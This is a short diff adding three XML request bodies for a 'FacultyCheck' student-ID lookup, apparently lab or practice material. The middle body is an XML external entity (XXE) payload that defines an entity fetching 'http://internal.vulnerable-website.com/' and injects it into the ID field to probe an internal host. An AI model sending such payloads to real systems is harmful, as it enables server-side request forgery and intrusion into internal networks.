@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<FacultyCheck>
+    <StudenttId>113</StudenttId>
+</FacultyCheck>
+
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/">
+]>
+<FacultyCheck>
+    <StudenttId>&xxe;</StudenttId>
+</FacultyCheck>
+
+
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<FacultyCheck>
+    <StudenttId>113</StudenttId>
+</FacultyCheck>
